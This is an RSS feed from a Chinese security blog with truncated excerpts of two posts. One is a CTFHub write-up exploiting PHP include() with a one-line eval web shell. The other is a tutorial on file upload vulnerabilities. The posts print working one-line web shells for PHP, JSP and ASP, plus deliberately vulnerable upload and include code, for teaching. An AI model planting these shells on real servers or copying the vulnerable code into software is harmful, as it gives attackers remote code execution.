<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>一句话木马 on 东阳的个人站点</title><link>https://Samantha09.github.io/san-blog/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</link><description>Recent content in 一句话木马 on 东阳的个人站点</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Fri, 05 Jun 2026 23:10:00 +0800</lastBuildDate><atom:link href="https://Samantha09.github.io/san-blog/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/index.xml" rel="self" type="application/rss+xml"/><item><title>CTFHub 文件包含实战：利用一句话木马 getshell</title><link>https://Samantha09.github.io/san-blog/posts/ctfhub-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-getshell/</link><pubDate>Fri, 05 Jun 2026 23:10:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/ctfhub-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-getshell/</guid><description>&lt;h2 id="一题目信息"&gt;一、题目信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;平台&lt;/strong&gt;：CTFHub&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分类&lt;/strong&gt;：Skill / Web / RCE / 文件包含&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;考点&lt;/strong&gt;：PHP &lt;code&gt;include&lt;/code&gt; 函数、一句话木马、WebShell 连接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;题目链接：&lt;a href="https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html"&gt;https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id="二源码分析"&gt;二、源码分析&lt;/h2&gt;
&lt;p&gt;进入题目后，直接给出了 PHP 源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;error_reporting&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;); &lt;span style="color:#75715e"&gt;// 关闭报错显示
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;])) { &lt;span style="color:#75715e"&gt;// 接收 file 参数
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;strpos&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;], &lt;span style="color:#e6db74"&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;) { &lt;span style="color:#75715e"&gt;// 如果包含 &amp;#34;flag&amp;#34; 字符串
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;hack&amp;#34;&lt;/span&gt;; &lt;span style="color:#75715e"&gt;// 输出 hack，阻止访问
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;include&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;]); &lt;span style="color:#75715e"&gt;// 否则包含指定文件
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="逻辑梳理"&gt;逻辑梳理&lt;/h3&gt;
&lt;table&gt;
	&lt;thead&gt;
			&lt;tr&gt;
					&lt;th&gt;条件&lt;/th&gt;
					&lt;th&gt;结果&lt;/th&gt;
			&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
			&lt;tr&gt;
					&lt;td&gt;&lt;code&gt;file&lt;/code&gt; 参数包含 &lt;code&gt;&amp;quot;flag&amp;quot;&lt;/code&gt;&lt;/td&gt;
					&lt;td&gt;输出 &lt;code&gt;hack&lt;/code&gt;，包含失败&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr&gt;
					&lt;td&gt;&lt;code&gt;file&lt;/code&gt; 参数不含 &lt;code&gt;&amp;quot;flag&amp;quot;&lt;/code&gt;&lt;/td&gt;
					&lt;td&gt;执行 &lt;code&gt;include($file)&lt;/code&gt;&lt;/td&gt;
			&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;核心考点&lt;/strong&gt;：&lt;code&gt;include()&lt;/code&gt; 函数的特性——&lt;strong&gt;不检查后缀，直接执行文件中的 PHP 代码&lt;/strong&gt;。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id="三发现突破口"&gt;三、发现突破口&lt;/h2&gt;
&lt;p&gt;题目下方有一个提示链接，访问后得到 &lt;code&gt;shell.txt&lt;/code&gt;：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;http://&amp;lt;TARGET_IP&amp;gt;:&amp;lt;PORT&amp;gt;/shell.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;内容是一句话木马：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;eval&lt;/span&gt;($_REQUEST[&lt;span style="color:#e6db74"&gt;&amp;#39;ctfhub&amp;#39;&lt;/span&gt;]);&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;连接密码&lt;/strong&gt;：&lt;code&gt;ctfhub&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;原理&lt;/strong&gt;：&lt;code&gt;eval()&lt;/code&gt; 函数将 &lt;code&gt;$_REQUEST['ctfhub']&lt;/code&gt; 接收到的内容作为 PHP 代码执行&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id="四解题思路"&gt;四、解题思路&lt;/h2&gt;
&lt;h3 id="41-include-函数的关键特性"&gt;4.1 include 函数的关键特性&lt;/h3&gt;
&lt;p&gt;假设 &lt;code&gt;index.php&lt;/code&gt; 中执行了：&lt;/p&gt;</description></item><item><title>文件上传漏洞实战：从无验证到 Getshell 的完整流程</title><link>https://Samantha09.github.io/san-blog/posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E4%BB%8E%E6%97%A0%E9%AA%8C%E8%AF%81%E5%88%B0-getshell-%E7%9A%84%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/</link><pubDate>Thu, 04 Jun 2026 00:00:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E4%BB%8E%E6%97%A0%E9%AA%8C%E8%AF%81%E5%88%B0-getshell-%E7%9A%84%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/</guid><description>&lt;h2 id="一什么是文件上传漏洞"&gt;一、什么是文件上传漏洞&lt;/h2&gt;
&lt;p&gt;文件上传漏洞是指 Web 应用程序允许用户上传文件，但&lt;strong&gt;没有对上传文件的类型、内容、后缀等进行充分校验&lt;/strong&gt;，导致攻击者可以上传恶意文件（如 Web Shell），进而控制服务器的安全漏洞。&lt;/p&gt;
&lt;h3 id="11-漏洞的本质"&gt;1.1 漏洞的本质&lt;/h3&gt;
&lt;p&gt;正常业务场景中，用户上传头像、文档、图片等文件，服务端将其保存到服务器目录。如果服务端&lt;strong&gt;信任了用户上传的所有文件&lt;/strong&gt;，攻击者就可以上传一个伪装成图片的 PHP 脚本，然后直接访问该脚本执行任意代码。&lt;/p&gt;
&lt;h3 id="12-典型的漏洞代码"&gt;1.2 典型的漏洞代码&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// 无验证的文件上传
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$target &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;upload/&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;basename&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#34;name&amp;#34;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#34;tmp_name&amp;#34;&lt;/span&gt;], $target);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这段代码直接将用户上传的文件保存到 &lt;code&gt;upload/&lt;/code&gt; 目录，不做任何类型检查。上传 &lt;code&gt;shell.php&lt;/code&gt; 后，访问 &lt;code&gt;http://target.com/upload/shell.php&lt;/code&gt; 即可执行恶意代码。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id="二常见应用场景"&gt;二、常见应用场景&lt;/h2&gt;
&lt;p&gt;文件上传漏洞通常出现在以下业务场景中：&lt;/p&gt;
&lt;h3 id="21-用户头像资料上传"&gt;2.1 用户头像/资料上传&lt;/h3&gt;
&lt;p&gt;社交平台、论坛、博客系统允许用户上传头像、背景图。如果仅检查文件扩展名或 MIME 类型，攻击者可以通过修改后缀、伪造 MIME 等方式绕过。&lt;/p&gt;
&lt;h3 id="22-附件与文档管理"&gt;2.2 附件与文档管理&lt;/h3&gt;
&lt;p&gt;企业 OA 系统、邮件系统、网盘允许上传文档、压缩包。如果服务端对压缩包内的文件不做二次检查，攻击者可以上传包含 Web Shell 的 ZIP 文件。&lt;/p&gt;
&lt;h3 id="23-编辑器与富文本组件"&gt;2.3 编辑器与富文本组件&lt;/h3&gt;
&lt;p&gt;富文本编辑器（如 UEditor、KindEditor）的图片上传功能，如果没有严格限制上传类型，可能成为 getshell 的入口。&lt;/p&gt;
&lt;h3 id="24-api-文件接口"&gt;2.4 API 文件接口&lt;/h3&gt;
&lt;p&gt;前后端分离架构中，前端通过 API 上传文件到 OSS 或服务器。如果 API 没有校验文件类型，攻击者可以直接调用接口上传任意文件。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id="三环境判断确定用什么木马"&gt;三、环境判断：确定用什么木马&lt;/h2&gt;
&lt;p&gt;上传木马前，必须先判断目标环境的语言和中间件，否则上传的木马无法执行。&lt;/p&gt;
&lt;h3 id="31-判断方法"&gt;3.1 判断方法&lt;/h3&gt;
&lt;table&gt;
	&lt;thead&gt;
			&lt;tr&gt;
					&lt;th&gt;方法&lt;/th&gt;
					&lt;th&gt;操作&lt;/th&gt;
					&lt;th&gt;示例&lt;/th&gt;
			&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
			&lt;tr&gt;
					&lt;td&gt;&lt;strong&gt;URL 后缀&lt;/strong&gt;&lt;/td&gt;
					&lt;td&gt;观察页面 URL&lt;/td&gt;
					&lt;td&gt;&lt;code&gt;index.php&lt;/code&gt; → PHP&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr&gt;
					&lt;td&gt;&lt;strong&gt;Wappalyzer 插件&lt;/strong&gt;&lt;/td&gt;
					&lt;td&gt;浏览器插件自动检测&lt;/td&gt;
					&lt;td&gt;显示 PHP、Apache、Nginx&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr&gt;
					&lt;td&gt;&lt;strong&gt;响应头&lt;/strong&gt;&lt;/td&gt;
					&lt;td&gt;查看 &lt;code&gt;X-Powered-By&lt;/code&gt;&lt;/td&gt;
					&lt;td&gt;&lt;code&gt;X-Powered-By: PHP/7.3.14&lt;/code&gt;&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr&gt;
					&lt;td&gt;&lt;strong&gt;报错页面&lt;/strong&gt;&lt;/td&gt;
					&lt;td&gt;触发 404 或报错&lt;/td&gt;
					&lt;td&gt;&lt;code&gt;Fatal error: Uncaught Error&lt;/code&gt; → PHP&lt;/td&gt;
			&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id="32-常见木马类型"&gt;3.2 常见木马类型&lt;/h3&gt;
&lt;table&gt;
	&lt;thead&gt;
			&lt;tr&gt;
					&lt;th&gt;环境&lt;/th&gt;
					&lt;th&gt;木马后缀&lt;/th&gt;
					&lt;th&gt;示例&lt;/th&gt;
			&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
			&lt;tr&gt;
					&lt;td&gt;PHP&lt;/td&gt;
					&lt;td&gt;&lt;code&gt;.php&lt;/code&gt;&lt;/td&gt;
					&lt;td&gt;&lt;code&gt;&amp;lt;?php eval(@$_POST['a']); ?&amp;gt;&lt;/code&gt;&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr&gt;
					&lt;td&gt;JSP&lt;/td&gt;
					&lt;td&gt;&lt;code&gt;.jsp&lt;/code&gt;&lt;/td&gt;
					&lt;td&gt;&lt;code&gt;&amp;lt;% Runtime.getRuntime().exec(request.getParameter(&amp;quot;cmd&amp;quot;)); %&amp;gt;&lt;/code&gt;&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr&gt;
					&lt;td&gt;ASP&lt;/td&gt;
					&lt;td&gt;&lt;code&gt;.asp&lt;/code&gt;&lt;/td&gt;
					&lt;td&gt;&lt;code&gt;&amp;lt;% eval request(&amp;quot;cmd&amp;quot;) %&amp;gt;&lt;/code&gt;&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr&gt;
					&lt;td&gt;ASPX&lt;/td&gt;
					&lt;td&gt;&lt;code&gt;.aspx&lt;/code&gt;&lt;/td&gt;
					&lt;td&gt;&lt;code&gt;&amp;lt;%@ Page Language=&amp;quot;Jscript&amp;quot; %&amp;gt;&lt;/code&gt;&lt;/td&gt;
			&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr&gt;
&lt;h2 id="四一句话木马原理"&gt;四、一句话木马原理&lt;/h2&gt;
&lt;h3 id="41-php-一句话木马"&gt;4.1 PHP 一句话木马&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;eval&lt;/span&gt;(&lt;span style="color:#f92672"&gt;@&lt;/span&gt;$_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;]); &lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;执行逻辑&lt;/strong&gt;：&lt;/p&gt;</description></item></channel></rss>